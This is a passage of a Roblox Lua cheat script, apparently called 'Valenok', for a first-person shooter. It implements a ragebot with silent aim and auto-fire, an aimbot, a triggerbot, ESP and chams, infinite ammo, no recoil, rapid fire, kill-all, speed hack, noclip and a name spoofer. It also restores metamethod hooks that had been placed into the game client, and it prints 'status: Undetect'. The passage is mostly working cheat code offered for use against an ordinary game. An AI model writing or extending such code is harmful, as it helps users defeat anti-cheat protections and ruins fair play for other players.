            if newVal > oldDamage then fireHitFeedback() end
            oldDamage = newVal
        end)
        return true
    end

    task.spawn(function()
        local additionals = LocalPlayer:WaitForChild("Additionals", 10)
        if not bindTotalDamage() and additionals then

            EspRuntime.Connections.TotalDamageAdded = additionals.ChildAdded:Connect(function(child)
                if child.Name == "TotalDamage" then bindTotalDamage() end
            end)
        end
    end)
end)()

if getgenv().ValenokFovCircles then
    for _, c in ipairs(getgenv().ValenokFovCircles) do
        pcall(function() c.Visible = false; c:Remove() end)
    end
end
Shared.ensureFovCircles()
getgenv().ValenokFovCircles = { AimRuntime.AimFovCircle, AimRuntime.RageFovCircle, AimRuntime.SpreadCircle, AimRuntime.SpreadText }

_hitSoundObj = Instance.new("Sound")
_hitSoundObj.Parent = workspace

local function restoreClientAmmoSafe()
    local t = InfAmmoState and InfAmmoState.table
    if not isClientAmmoTable or not isClientAmmoTable(t) then
        t = tryFindAmmoFromClientEnv and tryFindAmmoFromClientEnv() or nil
        if t then InfAmmoState.table = t end
    end
    if not t then return end

    local weapons = getWeaponsFolder and getWeaponsFolder() or nil
    local client = getCachedClient and getCachedClient() or nil
    local function ammoOf(name, fallback)
        if weapons and type(name) == "string" and name ~= "" and name ~= "none" then
            local folder = weapons:FindFirstChild(name)
            local ammo = folder and folder:FindFirstChild("Ammo")
            if ammo and type(ammo.Value) == "number" and ammo.Value > 0 and ammo.Value <= 150 then
                return math.floor(ammo.Value)
            end
        end
        return fallback
    end

    local primaryName = client and (client.realgun or client.primary)
    local secondaryName = client and client.secondary
    local a1 = ammoOf(primaryName, 30)
    local a2 = ammoOf(secondaryName, 12)
    local a3 = 1
    local a4 = 1

    if type(t.ammocount) == "number" and (t.ammocount > 150 or t.ammocount ~= t.ammocount or t.ammocount == math.huge) then
        t.ammocount = a1
    end
    if type(t.ammocount2) == "number" and (t.ammocount2 > 150 or t.ammocount2 ~= t.ammocount2 or t.ammocount2 == math.huge) then
        t.ammocount2 = a2
    end
    if type(t.ammocount3) == "number" and (t.ammocount3 > 150 or t.ammocount3 ~= t.ammocount3 or t.ammocount3 == math.huge) then
        t.ammocount3 = a3
    end
    if type(t.ammocount4) == "number" and (t.ammocount4 > 150 or t.ammocount4 ~= t.ammocount4 or t.ammocount4 == math.huge) then
        t.ammocount4 = a4
    end

    local function fixStored(key, fallback)
        local v = rawget(t, key)
        if type(v) == "number" and (v > 999 or v ~= v or v == math.huge) then
            t[key] = fallback
        end
    end
    fixStored("primarystored", a1 * 2)
    fixStored("secondarystored", a2 * 2)
    fixStored("equipmentstored", 1)
    fixStored("equipment2stored", 1)
end

local function restoreWeaponModsSafe()
    pcall(restoreClientAmmoSafe)
    pcall(restoreAllRapidFireRates)
    pcall(restoreAllFullAutoValues)
    pcall(function() applyNoRecoil(false) end)
    pcall(function() applyNoSpread(false) end)
    pcall(function() applyInstaEquip(false) end)
    pcall(function() applyInstaReload(false) end)

    pcall(function()
        local Weapons = getWeaponsFolder()
        if not Weapons then return end
        for weaponName, original in pairs(RCSOriginalValues) do
            local weaponFolder = Weapons:FindFirstChild(weaponName)
            local spread = weaponFolder and weaponFolder:FindFirstChild("Spread")
            local recoil = spread and spread:FindFirstChild("Recoil")
            if recoil and recoil:IsA("NumberValue") and type(original) == "number" and original > 0 then
                recoil.Value = original
            end
        end
        table.clear(RCSOriginalValues)

        for weaponName, original in pairs(SavedRecoilValues) do
            local weaponFolder = Weapons:FindFirstChild(weaponName)
            local spread = weaponFolder and weaponFolder:FindFirstChild("Spread")
            local recoil = spread and spread:FindFirstChild("Recoil")
            if recoil and recoil:IsA("NumberValue") and type(original) == "number" and original > 0 then
                recoil.Value = original
            end
        end
        table.clear(SavedRecoilValues)

        for weaponName, original in pairs(InstaWeaponState.SavedEquipTimes) do
            local weaponFolder = Weapons:FindFirstChild(weaponName)
            local EquipTime = weaponFolder and weaponFolder:FindFirstChild("EquipTime")
            if EquipTime and EquipTime:IsA("NumberValue") then EquipTime.Value = original end
        end
        for weaponName, original in pairs(InstaWeaponState.SavedReloadTimes) do
            local weaponFolder = Weapons:FindFirstChild(weaponName)
            local ReloadTime = weaponFolder and weaponFolder:FindFirstChild("ReloadTime")
            if ReloadTime and ReloadTime:IsA("NumberValue") then ReloadTime.Value = original end
        end
    end)
    table.clear(InstaWeaponState.SavedEquipTimes)
    table.clear(InstaWeaponState.SavedReloadTimes)

    pcall(function()
        local Client = getCachedClient()
        if Client and OriginalAccuracySd ~= nil then
            Client.accuracy_sd = OriginalAccuracySd
            OriginalAccuracySd = nil
        end
    end)

    pcall(function()
        local Weapons = getWeaponsFolder()
        if not Weapons then return end
        for _, weaponFolder in ipairs(Weapons:GetChildren()) do
            local spread = weaponFolder:FindFirstChild("Spread")
            local recoil = spread and spread:FindFirstChild("Recoil")
            if recoil and recoil:IsA("NumberValue") and recoil.Value == 0 then
                recoil.Value = 1
            end
        end
    end)
end

unloadValenok = function()
    if getgenv()._ValenokUnloading then return end
    getgenv()._ValenokUnloading = true
    pcall(function()
        local leave = getgenv().__ValenokPresenceLeaveV2_legasy
        if type(leave) == "function" then leave() end
    end)
    getgenv()._SCInvSkipNetworkOnUnload = true
    local fromLibraryUnload = getgenv()._ValenokFromLibraryUnload == true

    getgenv()._SCInvPushGen = (getgenv()._SCInvPushGen or 0) + 1
    getgenv()._SCInvPushLoop = false
    if Shared.AmbienceState then Shared.AmbienceState.LoopRunning = false end
    if Shared.SkyboxState then Shared.SkyboxState.loadGen = (Shared.SkyboxState.loadGen or 0) + 1 end

    if PeekAssist then
        PeekAssist.Returning = false
        PeekAssist.Active = false
        PeekAssist.SavedCFrame = nil
    end

    for _, Connection in pairs(EspRuntime.Connections) do
        pcall(function() Connection:Disconnect() end)
    end
    table.clear(EspRuntime.Connections)
    MoveLoop.clear()
    if HitMarkerState.HeartbeatConn then
        HitMarkerState.HeartbeatConn:Disconnect()
        HitMarkerState.HeartbeatConn = nil
    end
    if InfAmmoState.charConn then
        InfAmmoState.charConn:Disconnect()
        InfAmmoState.charConn = nil
    end
    if SC.cleanupSkinConnections then pcall(SC.cleanupSkinConnections) end
    if SC.State.armsConn then
        SC.State.armsConn:Disconnect()
        SC.State.armsConn = nil
    end
    if getgenv()._SCInvPushLeaveConn then
        pcall(function() getgenv()._SCInvPushLeaveConn:Disconnect() end)
        getgenv()._SCInvPushLeaveConn = nil
    end
    if Shared.SkyboxState.guardConn then
        Shared.SkyboxState.guardConn:Disconnect()
        Shared.SkyboxState.guardConn = nil
    end
    RageHitLog.clearPendingWatch()
    if RageHitLog.FeedbackConn then
        pcall(function() RageHitLog.FeedbackConn:Disconnect() end)
        RageHitLog.FeedbackConn = nil
    end

    pcall(function() if LoopState then LoopState.running = false end end)
    Shared.SpeedHackState.Conn = nil
    Shared.AutoJumpState.Conn = nil
    Shared.AutoCrouchState.Conn = nil
    Shared.FakeDuckState.Conn = nil
    Shared.BhopState.Conn = nil
    Shared.LegitBhopState.Conn = nil
    Shared.NoclipState.Conn = nil
    Shared.FlyState.Conn = nil
    pcall(Shared.restoreNoclipParts)

    restoreNamecallHook()
    restoreNewindexHook()
    pcall(NanParticleGuard.restore)
    getgenv().PSilentTarget = nil
    getgenv().PSilentAimPoint = nil
    getgenv().IgnoreRaycastHook = false

    if Shared.cleanupNameSpoofer then
        pcall(Shared.cleanupNameSpoofer)
        Shared.cleanupNameSpoofer = nil
    end
    if Shared.cleanupViewModelVisuals then
        pcall(Shared.cleanupViewModelVisuals)
    end

    pcall(restoreWeaponModsSafe)

    if Shared.SkyboxState.customSky then
        pcall(function() Shared.SkyboxState.customSky:Destroy() end)
        Shared.SkyboxState.customSky = nil
    end
    if Shared.SkyboxState.originalSky and not Shared.SkyboxState.originalSky.Parent then
        pcall(function() Shared.SkyboxState.originalSky.Parent = game:GetService('Lighting') end)
    end

    if SC.Models then pcall(function() SC.Models:Destroy() end); SC.Models = nil end

    for _, c in ipairs({ AimRuntime.AimFovCircle, AimRuntime.RageFovCircle, AimRuntime.SpreadCircle, AimRuntime.SpreadText }) do
        pcall(function() c.Visible = false; c:Remove() end)
    end
    AimRuntime.AimFovCircle = nil
    AimRuntime.RageFovCircle = nil
    AimRuntime.SpreadCircle = nil
    AimRuntime.SpreadText = nil
    getgenv().ValenokFovCircles = nil

    if Shared.CrosshairState.Circle then
        pcall(function() Shared.CrosshairState.Circle.Visible = false; Shared.CrosshairState.Circle:Remove() end)
        Shared.CrosshairState.Circle = nil
    end
    if Shared.CrosshairState.Outline then
        pcall(function() Shared.CrosshairState.Outline.Visible = false; Shared.CrosshairState.Outline:Remove() end)
        Shared.CrosshairState.Outline = nil
    end
    if Shared.CrosshairState.StateText then
        pcall(function() Shared.CrosshairState.StateText.Visible = false; Shared.CrosshairState.StateText:Remove() end)
        Shared.CrosshairState.StateText = nil
    end
    Shared.CrosshairState.Created = false
    for i, t in pairs(RageHitLog.Texts) do
        pcall(function() t.Visible = false; t:Remove() end)
        RageHitLog.Texts[i] = nil
    end
    RageHitLog.Created = false
    RageHitLog.Entries = {}

    if getgenv().ValenokHitMarker then
        for _, d in ipairs(getgenv().ValenokHitMarker) do
            pcall(function() d.Visible = false; d:Remove() end)
        end
        getgenv().ValenokHitMarker = nil
    end
    HitMarkerState.Created = false
    HitMarkerState.Fading = false
    table.clear(HitMarkerState.OutlineLines)
    table.clear(HitMarkerState.FillLines)

    hidePeekCircle()
    if PeekDraw.Ready then
        for i = 1, PEEK_CIRCLE_SEGMENTS do
            if PeekDraw.CircleLines[i] then pcall(function() PeekDraw.CircleLines[i]:Remove() end) end
            if PeekDraw.CircleOutlines[i] then pcall(function() PeekDraw.CircleOutlines[i]:Remove() end) end
        end
        for i = 1, PEEK_FILL_SEGMENTS do
            if PeekDraw.FillLines[i] then pcall(function() PeekDraw.FillLines[i]:Remove() end) end
        end
    end
    table.clear(PeekDraw.CircleLines)
    table.clear(PeekDraw.CircleOutlines)
    table.clear(PeekDraw.FillLines)
    PeekDraw.Ready = false

    applyNoScope(false)

    local pg = getPlayerGui()
    local blnd = pg and pg:FindFirstChild("Blnd")
    if blnd then blnd.Enabled = true end

    for Player, DrawingSet in pairs(EspRuntime.Drawings) do
        EspRuntime.RemoveDrawingValue(DrawingSet)
        EspRuntime.Drawings[Player] = nil
    end
    for item, t in pairs(EspRuntime.ItemDrawings) do
        pcall(function() t.Visible = false; t:Remove() end)
        EspRuntime.ItemDrawings[item] = nil
    end
    for player in pairs(EspRuntime.Chams) do
        Shared.removePlayerChams(player)
    end
    for player in pairs(EspRuntime.Highlights) do
        Shared.removeHighlight(player)
    end
    table.clear(EspRuntime.Drawings)
    table.clear(EspRuntime.ItemDrawings)
    table.clear(EspRuntime.Chams)
    table.clear(EspRuntime.Highlights)
    table.clear(EspFrameCache.toggles)
    table.clear(EspFrameCache.options)
    table.clear(EspFrameCache.colors)
    EspFrameCache.tick, EspFrameCache.anyEnabled = 0, false

    clearBulletTracers()
    table.clear(EspPlayerCache)
    table.clear(ChamsVisCache)
    table.clear(RayIgnoreMemo)
    table.clear(CharIgnorePartsCache)
    table.clear(IgnoreRootsCache)
    if ModeCache then ModeCache.t, ModeCache.value = 0, false end
    if TeamIgnoreCache then TeamIgnoreCache.t, TeamIgnoreCache.value = 0, false end
    if Shared.NoclipState then
        Shared.NoclipState.Saved = {}
        Shared.NoclipState.Parts = {}
        Shared.NoclipState.Character = nil
    end

    if _hitSoundObj then
        pcall(function() _hitSoundObj:Destroy() end)
        _hitSoundObj = nil
    end

    pcall(function()
        RunService:UnbindFromRenderStep("ValenokTPNoClip")
        Shared.ThirdPersonNoClipBound = false
    end)
    pcall(function() RunService:UnbindFromRenderStep("ValenokAntiAim") end)
    pcall(function()
        if Shared.unbindFovChanger then Shared.unbindFovChanger() end
        local cam = getCamera()
        if cam then cam.FieldOfView = 80 end
    end)

    pcall(function()
        if getgenv().HUD_OriginalState then
            for inst, state in pairs(getgenv().HUD_OriginalState) do
                if inst and inst.Parent then
                    if inst:IsA("GuiObject") then
                        inst.Visible = state.Visible
                        inst.BackgroundTransparency = state.BackgroundTransparency
                        inst.BorderSizePixel = state.BorderSizePixel
                        if state.ImageTransparency then inst.ImageTransparency = state.ImageTransparency end
                        if state.TextTransparency then inst.TextTransparency = state.TextTransparency end
                    elseif inst:IsA("UIStroke") then
                        inst.Enabled = state.Enabled
                        inst.Transparency = state.Transparency
                    end
                end
            end
        end
        if getgenv().HUD_Connections then
            for _, data in pairs(getgenv().HUD_Connections) do
                if data.Connection then data.Connection:Disconnect() end
                if data.AncestryConn then data.AncestryConn:Disconnect() end
                if data.PropConns then
                    for _, pConn in pairs(data.PropConns) do pConn:Disconnect() end
                end
            end
        end
        getgenv().HUD_Connections = nil
        getgenv().HUD_OriginalState = nil
    end)

    pcall(function()
        LocalPlayer.CameraMaxZoomDistance = 0.5
        LocalPlayer.CameraMinZoomDistance = 0.5
        local _, humanoid = getCachedCharacterParts(LocalPlayer)
        if humanoid then humanoid.AutoRotate = true end
        local cam = getCamera()
        if cam then
            local arms = cam:FindFirstChild("Arms")
            if arms then
                for _, part in ipairs(arms:GetDescendants()) do
                    if part:IsA("BasePart") or part:IsA("MeshPart") then
                        part.LocalTransparencyModifier = 0
                    end
                end
            end
        end
    end)

    TriggerbotState.DelayUntil = 0
    TriggerbotState.DelayActive = false
    TriggerbotState.IsFiring = false
    TriggerbotState.LastFire = 0
    TriggerbotState.TargetPart = nil

    pcall(Shared.restoreAmbienceSaved)

    pcall(function()
        if getgenv().ValenokRestoreCrosshair then
            getgenv().ValenokRestoreCrosshair()
        end
    end)

    pcall(function()
        if GrenadeRuntime and GrenadeRuntime.Folder then
            GrenadeRuntime.Folder:Destroy()
            GrenadeRuntime.Folder = nil
        end
        local folder = workspace:FindFirstChild("ValenokGrenadeAreas")
        if folder then folder:Destroy() end
        local rayIgnore = workspace:FindFirstChild("Ray_Ignore")
        local fires = rayIgnore and rayIgnore:FindFirstChild("Fires")
        if fires then
            for _, desc in ipairs(fires:GetDescendants()) do
                if desc.Name == "ValenokGrenadeArea" then
                    pcall(function() desc:Destroy() end)
                end
            end
        end
    end)

    pcall(function()
        local LightingSvc = game:GetService("Lighting")
        if Shared.AmbienceState then
            local skyCC = LightingSvc:FindFirstChild("ValenokSkyCC")
            if skyCC then skyCC:Destroy() end
            local skyColorCC = LightingSvc:FindFirstChild("ValenokSkyColorCC")
            if skyColorCC then skyColorCC:Destroy() end
            if Shared.AmbienceState.OrigTechnology ~= nil then
                pcall(function() sethiddenproperty(LightingSvc, "Technology", Shared.AmbienceState.OrigTechnology) end)
            end
            if Shared.AmbienceState.OrigAmbient ~= nil then
                LightingSvc.Ambient = Shared.AmbienceState.OrigAmbient
            end
            if Shared.AmbienceState.OrigOutdoorAmbient ~= nil then
                LightingSvc.OutdoorAmbient = Shared.AmbienceState.OrigOutdoorAmbient
            end
            if Shared.AmbienceState.OrigLightingBrightness ~= nil then
                LightingSvc.Brightness = Shared.AmbienceState.OrigLightingBrightness
            end
            local satCC = LightingSvc:FindFirstChild("ValenokSaturationCC")
            if satCC then satCC:Destroy() end
        end
    end)

    pcall(Shared.restoreSpeedHackOriginal)
    pcall(function() VirtualInputManager:SendKeyEvent(false, MoveUtil.MOVE_KEY_CTRL, false, game) end)
    if Shared.FakeDuckState then
        if Shared.FakeDuckState.Track then
            pcall(function() Shared.FakeDuckState.Track:Stop() end)
            Shared.FakeDuckState.Track = nil
        end
        Shared.FakeDuckState.Humanoid = nil
    end
    pcall(function()
        local hum = MoveUtil.getLocalHumanoid()
        if hum then hum.WalkSpeed = CONSTANTS.DEFAULT_WALK_SPEED end
    end)
    pcall(Shared.restoreFlyPhysics)

    if not fromLibraryUnload then
        pcall(function() Library:Unload() end)
    end

    getgenv().ValenokUnload = nil
    getgenv()._SCInvPushLeave = nil
    getgenv()._SCInvPushLeaveConn = nil
    getgenv().ValenokRestoreCrosshair = nil
    getgenv()._SCInvSkipNetworkOnUnload = nil
    getgenv()._ValenokFromLibraryUnload = nil
    getgenv()._ValenokHooksActive = false
    getgenv()._ValenokUnloading = nil
end
getgenv().ValenokUnload = unloadValenok
do
    local _unload = unloadValenok
    unloadValenok = function(...)
        getgenv()._SCInvSkipNetworkOnUnload = true
        if getgenv()._SCInvPushLeave then pcall(getgenv()._SCInvPushLeave) end
        return _unload(...)
    end
    getgenv().ValenokUnload = unloadValenok
end

local function setupWeaponChangeListener(character)
    if not character then return end
    local eqTool = character:WaitForChild("EquippedTool", 5)
    if not eqTool then return end
    if EspRuntime.Connections.EquippedToolChanged then
        EspRuntime.Connections.EquippedToolChanged:Disconnect()
    end
    EspRuntime.Connections.EquippedToolChanged = eqTool.Changed:Connect(function()
        if Toggles.GunModsRapidFire and Toggles.GunModsRapidFire.Value then
            updateRapidFire()
        end
        if Toggles.RCSEnable and Toggles.RCSEnable.Value then
            updateRCS()
        end
    end)
    if Toggles.GunModsRapidFire and Toggles.GunModsRapidFire.Value then
        updateRapidFire()
    end
    if Toggles.RCSEnable and Toggles.RCSEnable.Value then
        updateRCS()
    end
end

;(function()
    if LocalPlayer.Character then
        task.spawn(setupWeaponChangeListener, LocalPlayer.Character)
    end
    EspRuntime.Connections.WeaponCharAdded = LocalPlayer.CharacterAdded:Connect(setupWeaponChangeListener)

    EspRuntime.Connections.PlayerRemoving = Players.PlayerRemoving:Connect(function(player)
        pcall(function()
            local charConn = EspRuntime.Connections["CharAdded_" .. player.UserId]
            if charConn then
                charConn:Disconnect()
                EspRuntime.Connections["CharAdded_" .. player.UserId] = nil
            end
            Shared.removeDrawingSet(player)
            Shared.removePlayerChams(player)
            Shared.removeHighlight(player)
            invalidateEspPlayerCache(player)
            if player.Character then invalidateCharIgnoreParts(player.Character) end
        end)
    end)

    EspRuntime.Connections.NoclipCharAdded = LocalPlayer.CharacterAdded:Connect(function(character)
        pcall(function()
            if Shared.NoclipState then
                Shared.NoclipState.Saved = {}
                Shared.clearNoclipRuntime()
            end
            invalidateEspPlayerCache(LocalPlayer)
            invalidateCharIgnoreParts(character)
        end)
    end)

    EspRuntime.Connections.PlayerCharAdded = Players.PlayerAdded:Connect(function(player)
        EspRuntime.Connections["CharAdded_" .. player.UserId] = player.CharacterAdded:Connect(function(character)
            invalidateEspPlayerCache(player)
            invalidateCharIgnoreParts(character)
        end)
    end)
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            EspRuntime.Connections["CharAdded_" .. player.UserId] = player.CharacterAdded:Connect(function(character)
                invalidateEspPlayerCache(player)
                invalidateCharIgnoreParts(character)
            end)
        end
    end
end)()

LoopState = {
    wFps = 0,
    wFrames = 0,
    wLastUpdate = 0,
    removalsCheck = 0,
    vmUpdate = 0,
    miscUpdate = 0,
    mainUpdate = 0,
    mainDt = 0,
    rageTargetUpdate = 0,
    rageTarget = nil,
    running = true,
    lastTick = os.clock(),
}

;(function()
local function getUpdateInterval()
    local rate = Options.MenuUpdateRate and Options.MenuUpdateRate.Value or 200
    if type(rate) ~= "number" or rate ~= rate then rate = 200 end
    rate = math.clamp(math.floor(rate + 0.5), 1, 500)
    return 1 / rate, rate
end

local function updateRagebot()
    local myChar = LocalPlayer.Character
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
    local isAlive = myHum and myHum.Health > 0 and myChar.Parent

    if not RuntimePack.canCombatFire() then
        RuntimePack.silentActive = false
        LoopState.rageTarget = nil
        getgenv().PSilentTarget = nil
        getgenv().PSilentAimPoint = nil
        return
    end

    local keybindActive = CombatScan.rageWanted()
    if Toggles.RagebotEnable and Toggles.RagebotEnable.Value and isAlive then
        RuntimePack.silentActive = keybindActive
    else
        RuntimePack.silentActive = false
    end

    if RuntimePack.silentActive then
        local now = tick()
        local silentTarget = CombatScan.ragePart
        local silentPoint = CombatScan.ragePoint
        LoopState.rageTarget = silentTarget
        LoopState.rageTargetUpdate = now
        getgenv().PSilentTarget = silentTarget
        getgenv().PSilentAimPoint = silentPoint

        local menuOpen = Library and Library.IsMenuVisible and Library:IsMenuVisible()
        local autoFire = Toggles.RagebotAutoFire and Toggles.RagebotAutoFire.Value and not menuOpen

        if autoFire and silentTarget and silentTarget.Parent then
            local targetChar = silentTarget:FindFirstAncestorOfClass("Model") or silentTarget.Parent
            if not hasShield(targetChar) then
                local rate = HitpartSilent.getFireRate and HitpartSilent.getFireRate() or 0.1
                if now - HitpartSilent.lastFire >= rate then
                    fireWeapShot()
                    if HitpartSilent.isHitpartMethod and HitpartSilent.isHitpartMethod() then
                        HitpartSilent.fire(silentTarget, silentPoint)
                    end
                end
            end
        end
    else
        LoopState.rageTarget = nil
        getgenv().PSilentTarget = nil
        getgenv().PSilentAimPoint = nil
    end

    if isAlive then
        updateAutoScope()
    elseif AutoScopeState.lastWant then
        setADS(getCachedClient(), false)
        AutoScopeState.lastWant = false
    end
end

local function runMainUpdate(stepDt)
    local now = tick()
    updateBulletTracers(now)
    local myChar = LocalPlayer.Character
    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
    local isAlive = myHum and myHum.Health > 0 and myChar.Parent

    CombatScan.refresh(now)

    local rageOk, rageErr = pcall(updateRagebot)
    if not rageOk then warn("[Valenok] Ragebot:", rageErr) end

    if now - LoopState.removalsCheck >= 2 then
        LoopState.removalsCheck = now
        if Toggles.RemovalsNoScope and Toggles.RemovalsNoScope.Value then updateNoScope() end
        if Toggles.RemovalsNoFlash and Toggles.RemovalsNoFlash.Value then updateNoFlash() end
        if Toggles.RCSEnable and Toggles.RCSEnable.Value then updateRCS() end
    end

    Shared.updateFovCircle()

    if isAlive then
        updateAimBot(stepDt)
    end

    updateCrosshair()

    updateEspFrameCache()
    if EspFrameCache.anyEnabled or next(EspRuntime.Drawings) or next(EspRuntime.Chams) then
        local plist = Players:GetPlayers()
        for i = 1, #plist do
            Shared.updatePlayerEsp(plist[i])
        end
    end
    if EspFrameCache.toggles.item or next(EspRuntime.ItemDrawings) then
        Shared.updateItemEsp()
    end

    if Toggles.MenuWatermark and Toggles.MenuWatermark.Value then
        if now - LoopState.wLastUpdate >= 0.3 then
            LoopState.wFps = math.floor(LoopState.wFrames / math.max(now - LoopState.wLastUpdate, 0.001))
            LoopState.wFrames = 0
            LoopState.wLastUpdate = now
            local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
            local timeStr = os.date("%H:%M:%S")
            Library:SetWatermark(string.format("yandere.sense.lua  |  %d fps  |  %d ms  |  %s", LoopState.wFps, ping, timeStr))
        end
    end

    updateThirdPerson()
    if Shared.MiscState.ambienceDirty then
        Shared.MiscState.ambienceDirty = false
        Shared.updateAmbience()
    end
    if isAlive then
        updateTriggerbot()
        updateAntiAim()
        updateGrenadePrediction(stepDt)
        updatePeekAssist()
    end

    local vmAnyEnabled = (Toggles.VMWeaponChams and Toggles.VMWeaponChams.Value)
        or (Toggles.VMArmChams and Toggles.VMArmChams.Value)
        or (Toggles.VMRemoveSleeves and Toggles.VMRemoveSleeves.Value)
        or (Toggles.VMRemoveGloves and Toggles.VMRemoveGloves.Value)
    if vmAnyEnabled and now - LoopState.vmUpdate >= 0.1 then
        LoopState.vmUpdate = now
        updateViewModelVisuals()
    end

    if now - LoopState.miscUpdate >= 2 then
        LoopState.miscUpdate = now
        if Toggles.MiscRemoveRadio and Toggles.MiscRemoveRadio.Value then Shared.applyRemoveRadio() end
    end
end

task.spawn(function()
    while LoopState.running do
        local t0 = os.clock()
        local stepDt = t0 - (LoopState.lastTick or t0)
        LoopState.lastTick = t0

        local ok, err = pcall(runMainUpdate, stepDt)
        if not ok then warn("[Valenok] Update:", err) end

        local interval = getUpdateInterval()
        local elapsed = os.clock() - t0
        task.wait(math.max(0, interval - elapsed))
    end
end)
end)()

EspRuntime.Connections.RenderStepped = RunService.RenderStepped:Connect(function()
    LoopState.wFrames = LoopState.wFrames + 1
end)

;(function()
    local CoreGui = game:GetService("CoreGui")
    local cachedObjects = {}
    local trackedGuis = {}
    local guiConns = {}
    local rootConns = {}

    local function trackText(obj)
        if not obj or cachedObjects[obj] then return end
        if obj:IsA("TextLabel") or obj:IsA("TextBox") then
            cachedObjects[obj] = true
        end
    end

    local function untrackText(obj)
        if obj then cachedObjects[obj] = nil end
    end

    local function scanGui(gui)
        if not gui then return end
        pcall(function()
            for _, v in ipairs(gui:GetDescendants()) do
                trackText(v)
            end
        end)
    end

    local function untrackGui(gui)
        local conns = guiConns[gui]
        if conns then
            for i = 1, #conns do
                pcall(function() conns[i]:Disconnect() end)
            end
            guiConns[gui] = nil
        end
        trackedGuis[gui] = nil
        pcall(function()
            for _, v in ipairs(gui:GetDescendants()) do
                untrackText(v)
            end
        end)
    end

    local function trackGui(gui)
        if not gui or trackedGuis[gui] then return end
        if not gui:IsA("LayerCollector") and not gui:IsA("ScreenGui") and not gui:IsA("BillboardGui") and not gui:IsA("SurfaceGui") then
            return
        end
        trackedGuis[gui] = true
        scanGui(gui)
        local conns = {}
        conns[#conns + 1] = gui.DescendantAdded:Connect(function(desc)
            trackText(desc)
        end)
        conns[#conns + 1] = gui.DescendantRemoving:Connect(function(desc)
            untrackText(desc)
        end)
        conns[#conns + 1] = gui.AncestryChanged:Connect(function(_, parent)
            if not parent then untrackGui(gui) end
        end)
        guiConns[gui] = conns
    end

    local function watchRoot(root)
        if not root or rootConns[root] then return end
        for _, child in ipairs(root:GetChildren()) do
            trackGui(child)
        end
        rootConns[root] = root.ChildAdded:Connect(function(child)
            trackGui(child)
        end)
    end

    local function bootstrap()
        pcall(function() watchRoot(CoreGui) end)
        local pg = LocalPlayer:FindFirstChild("PlayerGui")
        if pg then
            watchRoot(pg)
        else
            EspRuntime.Connections.SpoofPlayerGuiWait = LocalPlayer.ChildAdded:Connect(function(child)
                if child.Name == "PlayerGui" or child:IsA("PlayerGui") then
                    watchRoot(child)
                end
            end)
        end
    end

    local function applySpoof()
        if not Toggles.MiscSpoofName or not Toggles.MiscSpoofName.Value then return end
        local spoofName = Options.MiscSpoofedName and Options.MiscSpoofedName.Value or ""
        if spoofName == "" then return end
        local playerName = LocalPlayer.Name
        local displayName = LocalPlayer.DisplayName
        for obj in pairs(cachedObjects) do
            if not obj or not obj.Parent then
                cachedObjects[obj] = nil
            else
                local ok, text = pcall(function() return obj.Text end)
                if ok and type(text) == "string" then
                    local newText = text
                    if playerName ~= "" and string.find(newText, playerName, 1, true) then
                        newText = string.gsub(newText, playerName, spoofName, 1)
                    end
                    if displayName and displayName ~= "" and displayName ~= playerName and string.find(newText, displayName, 1, true) then
                        newText = string.gsub(newText, displayName, spoofName, 1)
                    end
                    if newText ~= text then
                        pcall(function() obj.Text = newText end)
                    end
                else
                    cachedObjects[obj] = nil
                end
            end
        end
    end

    local spoofRunning = true
    local spoofThread = nil

    Shared.cleanupNameSpoofer = function()
        spoofRunning = false
        if spoofThread then
            pcall(function() task.cancel(spoofThread) end)
            spoofThread = nil
        end
        for root, conn in pairs(rootConns) do
            pcall(function() conn:Disconnect() end)
            rootConns[root] = nil
        end
        for gui in pairs(trackedGuis) do
            untrackGui(gui)
        end
        table.clear(cachedObjects)
        table.clear(trackedGuis)
        table.clear(guiConns)
        table.clear(rootConns)
    end

    bootstrap()
    spoofThread = task.spawn(function()
        while spoofRunning do
            task.wait(1)
            if not spoofRunning then break end
            applySpoof()
        end
    end)
end)()

;(function()
    local killAllLastRun, infAmmoLastRun = 0, 0
    EspRuntime.Connections.KillAllHeartbeat = RunService.Heartbeat:Connect(function()
        pcall(function()
            local now = tick()
            patchClientNanParticleGuard()
            if now - killAllLastRun >= 0.05 then
                killAllLastRun = now
                updateKillAll()
            end
            if now - infAmmoLastRun >= 0.1 then
                infAmmoLastRun = now
                updateInfAmmo()
            end
        end)
    end)
end)()

print("version: 4.1")
print("status: Undetect")

Library:OnUnload(function()
    getgenv()._ValenokFromLibraryUnload = true
    pcall(function()
        if unloadValenok and not getgenv()._ValenokUnloading then
            unloadValenok()
        end
    end)
    getgenv().ValenokUnload = nil
    getgenv()._ValenokUnloading = nil
    getgenv()._ValenokFromLibraryUnload = nil
    if SC.State.armsConn then SC.State.armsConn:Disconnect(); SC.State.armsConn = nil end
    pcall(function()
        if SC.Viewmodels then
            if SC.Viewmodels:FindFirstChild("v_CT Knife") then SC.Viewmodels:FindFirstChild("v_CT Knife"):Destroy() end
            if SC.Viewmodels:FindFirstChild("v_T Knife") then SC.Viewmodels:FindFirstChild("v_T Knife"):Destroy() end
            if SC.OriginalCTKnife then SC.OriginalCTKnife:Clone().Parent = SC.Viewmodels end
            if SC.OriginalTKnife then SC.OriginalTKnife:Clone().Parent = SC.Viewmodels end
        end
    end)
end)

;(function()
    local origSave = SaveManager.Save
    local origLoad = SaveManager.Load

    SaveManager.Save = function(self, name, ...)
        local success, err = origSave(self, name, ...)
        if not success then return false, err end

        pcall(function()
            local fullPath = self.Folder .. '/settings/' .. name .. '.json'
            if not isfile(fullPath) then return end
            local data = HttpService:JSONDecode(readfile(fullPath))
            data.uiPositions = {}
            if Library.Watermark then
                local p = Library.Watermark.Position
                data.uiPositions.Watermark = { p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset }
            end
            if Library.KeybindFrame then
                local p = Library.KeybindFrame.Position
                data.uiPositions.Keybind = { p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset }
            end
            writefile(fullPath, HttpService:JSONEncode(data))
        end)

        return true
    end

    SaveManager.Load = function(self, name, ...)
        local success, err = origLoad(self, name, ...)
        if not success then return false, err end

        task.delay(0.1, function()
            pcall(function() applySkyboxChanger() end)
        end)

        pcall(function()
            local fullPath = self.Folder .. '/settings/' .. name .. '.json'
            if not isfile(fullPath) then return end
            local data = HttpService:JSONDecode(readfile(fullPath))
            if not data.uiPositions then return end

            task.delay(0.1, function()
